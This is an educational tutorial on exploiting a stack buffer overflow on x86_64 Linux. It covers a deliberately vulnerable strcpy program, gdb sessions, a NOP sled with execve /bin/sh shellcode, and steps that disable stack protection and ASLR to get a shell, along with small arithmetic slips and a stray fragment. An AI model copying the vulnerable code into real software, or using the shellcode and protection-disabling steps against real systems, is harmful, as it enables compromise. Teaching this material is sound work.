### Smashing the stack the old way ###

First of all we need some dependencies

```
sudo apt-get install gcc gdb
```

We asume that we have python2.7 installed beacuse we are going to use "\xHH" for escaping bytes and python3 doesnt handle them very well. Blame utf8 by default in this thing "\xHH" in python3.
We asume the target system fo the reader is a linux box x86_64, in other sistems should follow throught this readme with some minor modifications by the reader

Lets begin with a inocent program
```
#include<stdio.h>
#include<string.h>

int main(int argc, char** argv) {
    char buffer[500];
    strcpy(buffer, argv[1]);
    return 0;
}

```

Lets compile it
```
gcc vuln.c -o vuln

```

Attempting execution with a simple string such as 'hello' returns no errors
```
$ ./vuln hello
```

Now if we send more than what we defined in our buffer
```
$ ./vuln $(python -c 'print "\x41" * 524 ')
Segmentation fault
```

This means that we overrun the buffer

Lets retry this in the GDB debuger:

```
$ gdb vuln
(gdb) run $(python -c 'print "\x41" * 524 ')
Program received signal SIGSEGV, Segmentation fault.
0x00007f0041414141 in ?? ()
```

Now lets check the registers

```
(gdb) info reg
rip            0x7f0041414141   0x7f0041414141
```
This means that now we control what the rip register point to.
This is our powerfull weapon beacuse this is the vulnerability itself,
becuse if we can control rip we can point it to our malicious code.

Lets Introduce the nop-sled:

The NOOP instruction tells the CPU to do nothing and move to the next instruction.
The nop sled is like: pincture Boba Fet falling into the Sarlacc pit.
Anywhere we land into the middle of a nop-sled we end up in the same place.
And in the end of the nop-sled we are going to put our shellcode.
Then our main idea is to put a big enought nop-sled that takes almost all the buffer up to almost the address where rip is.

Again we run our inocent program with a bunch of nops
```
(gdb) run $(python -c 'print "\x90" * 524 ')
Program received signal SIGSEGV, Segmentation fault.
0x00007f0090909090 in ?? ()
```
The same happens but the rip address not points to **0x00007f0090909090**

We need to add to the end of the nop-sled our shellcode **"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"**

This is a generic linux-x86_64 execve /bin/sh shellcode

Its asm code is:
```
   0:   48 31 f6                xor    %rsi,%rsi
   3:   56                      push   %rsi
   4:   48 bf 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rdi
   b:   2f 73 68 
   e:   57                      push   %rdi
   f:   54                      push   %rsp
  10:   5f                      pop    %rdi
  11:   b0 3b                   mov    $0x3b,%al
  13:   99                      cltd   
  14:   0f 05                   syscall 
  16:   0a                      .byte 0x
```

Appending it and executing our exploit again:
```
(gdb) run $(python -c 'print "\x90" * 524 + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"  ')
Program received signal SIGSEGV, Segmentation fault.
0x0000555555555173 in main ()
```
As we can see the resulting address **0x0000555555555173** is not even in the stack range
we can check this with:

```
(gdb) info proc mappings
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555555000     0x555555556000     0x1000     0x1000 /home/dclavijo/stack_smashing/vuln
      0x7ffff7f87000     0x7ffff7f8a000     0x3000   0x1bb000 /lib/x86_64-linux-gnu/libc-2.30.so
      0x7ffff7fce000     0x7ffff7fd2000     0x4000        0x0 [vvar]
      0x7ffff7fd2000     0x7ffff7fd4000     0x2000        0x0 [vdso]
      0x7ffff7fd4000     0x7ffff7fd5000     0x1000        0x0 /lib/x86_64-linux-gnu/ld-2.30.so
      .
      .
      .
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x28000 /lib/x86_64-linux-gnu/ld-2.30.so
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]

```
Our stack is in the region of **0x7ffffffde000-0x7ffffffff000**.
this means that our nop-sled will need to covert all this region and our rip address will need to point to some place in this region.
lets say: **0x7fffffffdead**
We also need to substract the payload from the nop sled, the payload is 23 bytes so 524-23

Lets hit it again:
```
(gdb) run $(python -c 'print "\x90" * (524-23) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"  ')
Program received signal SIGSEGV, Segmentation fault.
0x00007fff00050f99 in ?? ()
```
We are getting close:

Fur last we need to add our rip address that is going to be overwriten:
ived signal SIGSEGV, Segmentation fault.

witch is **0x7fffffffdead** and in the x86_64 machine endianess:
We are going to add it more than one time because we are overwriting registers in ram so we dont know where exactly they are we only kknow that we need to be aligned in order for it to work. And we need to substract it from our nop-sled to not overshoot.

Lets try:
```
(gdb) run $(python -c 'print "\x90" * (524-23-30) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
Program received signal SIGSEGV, Segmentation fault.
0xffffffdead050f99 in ?? ()
```

We got very close:

**0xffffffdead050f99** is not the address we wanted to **0x7fffffffdead**
**0x7fffffffdead** is our return address in the middle of the nop-sled wen we overflow the RIP register wil point to this address and then the exploit beggins.

We need to align our exploit to the machine registers in ram 
A +2 will suffice

```
(gdb) run $(python -c 'print "\x90" * (524-23-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
```

Voila, we landed into the mouth of the Sarlacc, but why didn't our exploit worked at all?

```
(gdb) run $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffdead in ?? ()
```

But why didnt our exploit worked at all?

Lets inspect our RIP or (return instruction pointer):

```
0x00007fffffffdead in ?? ()
(gdb) x/10x 0x00007fffffffdead
0x7fffffffdead: 0x90909090  0x90909090  0x90909090  0x90909090
0x7fffffffdebd: 0x90909090  0x90909090  0x90909090  0x90909090
0x7fffffffdecd: 0x90909090  0x90909090
```

We can seed that effectively we landed in the middle of our nop-sled but nothing happened.
This is beacuse newer versions of gcc and linux by default set the execution bit of the stack page to disabled.
So we need to recompile again our inocent code disabling the stack execution protection.

```
gcc -z execstack  -g -fno-inline -fno-stack-protector -fno-pie -O0  vuln.c -o vuln
```

Lets hit it one more time
```
gdb vuln
(gdb) run $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
$
```
Holy shiet, we have our first shell executed from a an expoit!!!

Lets try one more thing, lets execute it outside gdb:

```
./vuln $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
Segmentation fault
```
WTF? why didn't work?
Newer versions of linux include ASLR or Address space layout randomization.
ASLR is a technique of address randomization witch re arranges the internal mappings of the sections of a process memory.
Our exploit didn't work beacuse we are asumming our program stack is going to be fixed in the range **0x7ffffffde000-0x7ffffffff000** and ASLR efectively prevents it to work beacuse in linux is enabled by defaut.
But we can disable it momentarily

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

And for last time:
```
./vuln $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
$
```

We got our exploit working.


References

* https://en.wikipedia.org/wiki/NOP_slide
* https://en.wikipedia.org/wiki/Address_space_layout_randomization
* http://phrack.org/issues/49/14.html

